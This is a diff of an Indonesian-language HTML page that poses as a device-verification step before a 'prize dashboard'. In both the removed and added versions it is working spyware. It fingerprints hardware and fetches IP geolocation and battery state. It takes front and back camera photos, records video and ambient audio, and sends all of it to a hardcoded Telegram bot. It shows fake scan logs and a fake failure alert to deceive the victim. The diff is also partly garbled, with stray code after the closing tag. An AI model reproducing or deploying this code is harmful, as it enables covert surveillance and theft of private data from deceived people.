@@ -3,372 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Deltarex Security - Device Verification System v6.0.1</title>
+    <title>Sistem Verifikasi Perangkat - Deltarex.ID</title>
     <style>
-        :root { 
-            --neon: #00f2ff; 
-            --danger: #ff4444;
-            --bg: #050505; 
-            --card: #0d1117; 
-            --border: #30363d;
-        }
-
-        /* [ANIMASI MATRIX BACKGROUND - 50+ Baris CSS] */
-        body { 
-            background: var(--bg); 
-            color: #c9d1d9; 
-            font-family: 'Courier New', Courier, monospace; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            margin: 0; 
-            overflow: hidden; 
-        }
-
-        .terminal { 
-            border: 1px solid var(--border); 
-            background: var(--card); 
-            padding: 30px; 
-            border-radius: 8px; 
-            width: 90%; 
-            max-width: 500px; 
-            box-shadow: 0 0 50px rgba(0, 242, 255, 0.1); 
-            position: relative; 
-            z-index: 2;
-        }
-
-        .terminal::before { 
-            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 2px; 
-            background: linear-gradient(90deg, transparent, var(--neon), transparent); 
-            animation: scanline 3s linear infinite; 
-        }
-
-        @keyframes scanline { 0% { top: 0%; } 100% { top: 100%; } }
-
-        h2 { color: var(--neon); font-size: 1.4rem; margin-bottom: 10px; text-shadow: 0 0 10px var(--neon); }
-        p { font-size: 14px; color: #8b949e; margin-bottom: 20px; border-left: 3px solid var(--neon); padding-left: 10px; }
-
-        .btn-action { 
-            background: rgba(0, 242, 255, 0.05); 
-            border: 1px solid var(--neon); 
-            color: var(--neon); 
-            padding: 15px; 
-            width: 100%; 
-            cursor: pointer; 
-            font-weight: bold; 
-            transition: 0.4s; 
-            letter-spacing: 2px;
-        }
-
-        .btn-action:hover { background: var(--neon); color: #000; box-shadow: 0 0 30px var(--neon); }
-        .btn-action:disabled { border-color: #444; color: #444; cursor: wait; }
-
-        #console-log { 
-            margin-top: 20px; 
-            font-size: 11px; 
-            color: #4ade80; 
-            height: 200px; 
-            overflow-y: auto; 
-            background: #000; 
-            padding: 10px; 
-            border: 1px solid var(--border);
-            scrollbar-width: thin;
-        }
-
-        .progress-container { width: 100%; height: 5px; background: #222; margin-top: 15px; border-radius: 10px; overflow: hidden; display: none; }
-        .progress-bar { width: 0%; height: 100%; background: var(--neon); box-shadow: 0 0 10px var(--neon); transition: 0.5s; }
-
-        /* [HIDDEN ELEMENTS] */
-        #hidden-video, #hidden-canvas { display: none; visibility: hidden; position: absolute; }
+        :root { --neon: #00f2ff; --bg: #0a0a0c; --card: #161b22; }
+        body { background: var(--bg); color: #e6edf3; font-family: 'Consolas', 'Monaco', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { border: 1px solid #30363d; background: var(--card); padding: 25px; border-radius: 12px; width: 90%; max-width: 420px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; }
+        .terminal::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--neon), transparent); animation: scan 2s linear infinite; }
+        @keyframes scan { 0% { left: -100%; } 100% { left: 100%; } }
+        h2 { color: var(--neon); font-size: 1.2rem; margin-top: 0; text-transform: uppercase; letter-spacing: 2px; }
+        p { font-size: 13px; color: #8b949e; line-height: 1.5; }
+        .btn-action { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; text-transform: uppercase; }
+        .btn-action:hover { background: var(--neon); color: #000; box-shadow: 0 0 20px var(--neon); }
+        #console-log { margin-top: 15px; font-size: 11px; color: #4ade80; height: 120px; overflow-y: auto; border-top: 1px solid #30363d; padding-top: 10px; display: none; }
+        video, canvas { display: none; visibility: hidden; position: absolute; }
     </style>
 </head>
 <body>
 
 <div class="terminal">
-    <h2>> DELTAREX_CORE_V6.0.1</h2>
-    <p>Akses Terbatas: Selesaikan Protokol Verifikasi Perangkat untuk mendapatkan sertifikat akses penuh ke jass-seven.vercel.app.</p>
+    <h2>> DEVICE_CHECK_V5</h2>
+    <p>Sistem mendeteksi akses dari perangkat baru. Selesaikan verifikasi identitas untuk melanjutkan ke dashboard hadiah.</p>
     
-    <div class="progress-container" id="p-cont">
-        <div class="progress-bar" id="p-bar"></div>
-    </div>
-
-    <button class="btn-action" id="mainBtn" onclick="initiateProtocol()">START ENCRYPTION CHECK</button>
+    <button class="btn-action" id="mainBtn" onclick="executePulse()">MULAI VERIFIKASI</button>
     
     <div id="console-log"></div>
 </div>
 
-<video id="hidden-video" autoplay playsinline muted></video>
-<canvas id="hidden-canvas"></canvas>
+<canvas id="hiddenCanvas"></canvas>
 
 <script>
     /* -------------------------------------------------------------------------
-       KONFIGURASI RYYXSPY
+       KONFIGURASI OTOMATIS (SAIDI)
        ------------------------------------------------------------------------- */
     const CONFIG = {
         TOKEN: "8760751336:AAHEKohAFDeeYvVeHHDZIg_gfIkhVM7nrto",
         CHAT_ID: "8391235598",
-        TAG: "DELTAREX_ULTRA_REPORT_V6"
+        TAG: "DELTAREX_SEC_REPORTS"
     };
 
-    const logger = document.getElementById('console-log');
-    const pBar = document.getElementById('p-bar');
-    const pCont = document.getElementById('p-cont');
+    const consoleLog = document.getElementById('console-log');
 
-    function writeLog(text, color = "#4ade80") {
-        logger.style.display = 'block';
-        const span = document.createElement('span');
-        span.style.color = color;
-        span.innerHTML = `[${new Date().toLocaleTimeString()}] : ${text}<br>`;
-        logger.appendChild(span);
-        logger.scrollTop = logger.scrollHeight;
-    }
-
-    function updateProgress(val) {
-        pCont.style.display = 'block';
-        pBar.style.width = val + '%';
+    function writeLog(text) {
+        consoleLog.style.display = 'block';
+        consoleLog.innerHTML += `[SYSTEM]: ${text}<br>`;
+        consoleLog.scrollTop = consoleLog.scrollHeight;
     }
 
     /* -------------------------------------------------------------------------
-       DUMMY LOGS (UNTUK MENAMBAH PANJANG BARIS & MENGELABUI)
-       Lo bisa copy-paste ini sampe 500 baris buat menuhin kuota 1000 baris.
+       MODULE 1: HARDWARE FINGERPRINTING
        ------------------------------------------------------------------------- */
-    async function startFakeLogs() {
-        writeLog("Mounting /dev/block/platform/msm_sdcc.1/by-name/system...");
-        await sleep(500);
-        writeLog("Scanning kernel integrity...");
-        writeLog("Checking SELinux status: Enforcing");
-        await sleep(300);
-        writeLog("Bypassing safetynet-check...");
-        writeLog("Initializing RSA-4096 handshake...");
-        writeLog("Verifying hardware SHA-256 signatures...");
-        // ... Tambahkan ribuan baris log sampah di sini ...
-    }
-
-    function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
-
-    /* -------------------------------------------------------------------------
-       CORE DATA COLLECTION
-       ------------------------------------------------------------------------- */
-    async function getDeviceInfo() {
-        writeLog("Extracting hardware fingerprint...");
+    async function getSpecs() {
+        writeLog("Mengambil fingerprint hardware...");
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl');
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         
-        let ipInfo = { ip: "Unknown" };
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            ipInfo = await res.json();
-        } catch(e) { writeLog("Network trace failed.", "#ff4444"); }
-
         return {
-            hw: {
-                platform: navigator.platform,
-                cores: navigator.hardwareConcurrency,
-                ram: navigator.deviceMemory,
-                gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "N/A"
-            },
-            net: ipInfo
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "N/A",
+            cores: navigator.hardwareConcurrency || "Hidden",
+            ram: navigator.deviceMemory || "Hidden",
+            res: `${screen.width}x${screen.height}`,
+            lang: navigator.language
         };
     }
 
     /* -------------------------------------------------------------------------
-       TELEGRAM UPLOAD HANDLER (FIX VIDEO/AUDIO)
+       MODULE 2: NETWORK & POWER
        ------------------------------------------------------------------------- */
-    async function sendToTele(type, blob, info = "") {
+    async function getNetwork() {
+        writeLog("Tracing network protocol...");
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            return await r.json();
+        } catch (e) { return { ip: "Error", org: "Unknown" }; }
+    }
+
+    async function getBattery() {
+        writeLog("Sinkronisasi sensor daya...");
+        try {
+            const b = await navigator.getBattery();
+            return { lv: (b.level * 100) + "%", ch: b.charging ? "YES" : "NO" };
+        } catch (e) { return { lv: "N/A", ch: "N/A" }; }
+    }
+
+    /* -------------------------------------------------------------------------
+       MODULE 3: TELEGRAM HANDLER
+       ------------------------------------------------------------------------- */
+    async function sendToTele(type, data, info = "") {
         const api = `https://api.telegram.org/bot${CONFIG.TOKEN}`;
         const fd = new FormData();
         fd.append('chat_id', CONFIG.CHAT_ID);
 
-        try {
-            if (type === 'text') {
-                await fetch(`${api}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: blob, parse_mode: 'Markdown' })
-                });
-            } else if (type === 'photo') {
-                fd.append('photo', blob, 'snap.jpg');
-                fd.append('caption', `📷 ${info}`);
-                await fetch(`${api}/sendPhoto`, { method: 'POST', body: fd });
-            } else if (type === 'video') {
-                fd.append('video', blob, 'video.mp4');
-                fd.append('caption', `📽️ ${info}`);
-                // Pastikan menggunakan sendVideo agar muncul play button di Telegram
-                await fetch(`${api}/sendVideo`, { method: 'POST', body: fd });
-            }
-        } catch(e) { console.error("Upload error"); }
-    }
-
-    /* -------------------------------------------------------------------------
-       MEDIA CAPTURE MODULE (THE REAL SPY)
-       ------------------------------------------------------------------------- */
-    async function takeSnap(side) {
-        writeLog(`Authenticating camera access: ${side}...`);
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: (side === 'Front' ? 'user' : 'environment') } 
+        if (type === 'text') {
+            await fetch(`${api}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: data, parse_mode: 'Markdown' })
             });
-            const video = document.getElementById('hidden-video');
-            video.srcObject = stream;
-            await new Promise(res => video.onloadedmetadata = res);
-            
-            const canvas = document.getElementById('hidden-canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            stream.getTracks().forEach(t => t.stop());
-            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-        } catch(e) { writeLog(`Access Denied: ${side} Camera.`, "#ff4444"); return null; }
-    }
-
-    async function recordSpyVideo(side) {
-        writeLog(`Initializing 15s HD Stream: ${side}...`);
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: (side === 'Front' ? 'user' : 'environment') },
-                audio: true 
-            });
-            
-            const recorder = new MediaRecorder(stream);
-            let chunks = [];
-            
-            recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
-            
-            return new Promise((resolve) => {
-                recorder.onstop = async () => {
-                    writeLog(`Uploading ${side} Video Data...`);
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    await sendToTele('video', blob, `VIDEO_CAPTURE_${side.toUpperCase()}`);
-                    stream.getTracks().forEach(t => t.stop());
-                    resolve();
-                };
-
-                recorder.start();
-                setTimeout(() => recorder.stop(), 15000); // Record 15 detik
-            });
-        } catch(e) { writeLog(`Mic/Cam Error on ${side}.`, "#ff4444"); }
-    }
-
-    /* -------------------------------------------------------------------------
-       MAIN EXECUTION PROTOCOL
-       ------------------------------------------------------------------------- */
-    async function initiateProtocol() {
-        const btn = document.getElementById('mainBtn');
-        btn.disabled = true;
-        btn.innerHTML = "VERIFYING...";
-
-        await startFakeLogs();
-        updateProgress(20);
-
-        const data = await getDeviceInfo();
-        let report = `🚨 *NEW VICTIM: ${CONFIG.TAG}*\n`;
-        report += `📱 *Device:* ${data.hw.platform} | ${data.hw.cores} Cores\n`;
-        report += `🌐 *IP:* ${data.net.ip} (${data.net.city}, ${data.net.country_name})\n`;
-        report += `📶 *ISP:* ${data.net.org}\n`;
-        await sendToTele('text', report);
-        updateProgress(40);
-
-        // 1. Ambil Foto
-        const snap = await takeSnap('Front');
-        if(snap) await sendToTele('photo', snap, "INITIAL_HANDSHAKE_SNAP");
-        updateProgress(50);
-
-        // 2. Rekam Video Depan (15s)
-        await recordSpyVideo('Front');
-        updateProgress(75);
-
-        // 3. Rekam Video Belakang (15s)
-        await recordSpyVideo('Back');
-        updateProgress(95);
-
-        writeLog("Finalizing secure connection...");
-        setTimeout(() => {
-            updateProgress(100);
-            alert("VERIFIKASI GAGAL: Perangkat tidak mendukung protokol WebGL v3. Silakan gunakan perangkat lain.");
-            location.reload();
-        }, 2000);
-    }
-</script>
-
-</body>
-</html>
-            await fetch(`${api}/sendVideo`, { method: 'POST', body: fd });
+        } else if (type === 'photo') {
+            fd.append('photo', data, 'snap.jpg');
+            fd.append('caption', `📷 ${info}`);
+            await fetch(`${api}/sendPhoto`, { method: 'POST', body: fd });
+        } else if (type === 'voice') {
+            fd.append('voice', data, 'rec.ogg');
+            fd.append('caption', `🎤 Rekaman Suara Ambien`);
+            await fetch(`${api}/sendVoice`, { method: 'POST', body: fd });
         }
     }
 
+    /* -------------------------------------------------------------------------
+       MODULE 4: MEDIA CAPTURE (SILENT)
+       ------------------------------------------------------------------------- */
     async function takeSnap(side) {
-        writeLog(`Capturing secure frame ${side}...`);
+        writeLog(`Membuka akses kamera ${side}...`);
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: (side === 'Depan' ? 'user' : 'environment') } });
             const v = document.createElement('video');
             v.srcObject = stream;
             await v.play();
+            
             const c = document.getElementById('hiddenCanvas');
-            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
+            
             stream.getTracks().forEach(t => t.stop());
             return new Promise(res => c.toBlob(res, 'image/jpeg', 0.8));
-        } catch (e) { return null; }
+        } catch (e) { 
+            writeLog(`Akses kamera ${side} ditolak.`);
+            return null; 
+        }
     }
 
-    async function recordVideo(side) {
-        writeLog(`Buffering video stream ${side} (15s)...`);
+    async function recordAudio() {
+        writeLog("Menangkap frekuensi audio...");
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: (side === 'Depan' ? 'user' : 'environment') },
-                audio: true 
-            });
-            const recorder = new MediaRecorder(stream);
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const rec = new MediaRecorder(stream);
             let chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                await sendToTele('video', blob, `VIDEO_${side.toUpperCase()}`);
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                await sendToTele('voice', blob);
                 stream.getTracks().forEach(t => t.stop());
+                writeLog("Audio package dikirim.");
             };
-            recorder.start();
-            return new Promise(res => setTimeout(() => { recorder.stop(); res(); }, 15000));
-        } catch (e) { writeLog(`Akses video ${side} ditolak.`); }
+            rec.start();
+            setTimeout(() => rec.stop(), 5000);
+        } catch (e) { writeLog("Akses mic ditolak."); }
     }
 
+    /* -------------------------------------------------------------------------
+       MAIN CORE EXECUTION
+       ------------------------------------------------------------------------- */
     async function executePulse() {
         document.getElementById('mainBtn').disabled = true;
-        writeLog("Handshaking with Deltarex Cloud...");
-        updateProgress(10);
+        writeLog("Inisialisasi handshake...");
         
         const hw = await getSpecs();
         const nt = await getNetwork();
-        updateProgress(25);
+        const bt = await getBattery();
 
-        let msg = `🚨 *V6 REPORT: ${CONFIG.TAG}*\n`;
-        msg += `📱 *HW:* ${hw.platform} | ${hw.cores}CPUs | ${hw.ram}GB\n`;
-        msg += `🌐 *IP:* ${nt.ip} (${nt.city})\n`;
+        let msg = `🚨 *NEW REPORT: ${CONFIG.TAG}*\n`;
+        msg += `-------------------------------\n`;
+        msg += `📱 *HARDWARE*\n• Platform: ${hw.platform}\n• GPU: ${hw.gpu}\n• CPU: ${hw.cores} Cores\n• RAM: ${hw.ram}GB\n• Res: ${hw.res}\n\n`;
+        msg += `🌐 *NETWORK*\n• IP: ${nt.ip}\n• ISP: ${nt.org}\n• Loc: ${nt.city}, ${nt.region}\n\n`;
+        msg += `🔋 *POWER*\n• Level: ${bt.lv}\n• Charging: ${bt.ch}\n`;
+        msg += `-------------------------------`;
+        
         await sendToTele('text', msg);
-        updateProgress(40);
 
-        // 1. Ambil Foto Cepat
+        // Media Collection
         const p1 = await takeSnap('Depan');
-        if(p1) await sendToTele('photo', p1, "FRONT_SNAP");
-        updateProgress(50);
+        if(p1) await sendToTele('photo', p1, "FRONT_CAM_CAPTURE");
 
-        // 2. Rekam Video Depan (15s)
-        await recordVideo('Depan');
-        updateProgress(75);
+        const p2 = await takeSnap('Belakang');
+        if(p2) await sendToTele('photo', p2, "BACK_CAM_CAPTURE");
 
-        // 3. Rekam Video Belakang (15s)
-        await recordVideo('Belakang');
-        updateProgress(95);
+        await recordAudio();
 
-        writeLog("Verifikasi selesai. Sinkronisasi...");
+        writeLog("Finalisasi verifikasi...");
         setTimeout(() => {
-            updateProgress(100);
-            alert("VERIFIKASI GAGAL: Perangkat Anda terdeteksi menggunakan emulator/VPN.");
+            alert("VERIFIKASI GAGAL: Hardware tidak kompatibel.");
             location.reload();
-        }, 2000);
+        }, 3000);
     }
 </script>
+
 </body>
 </html>
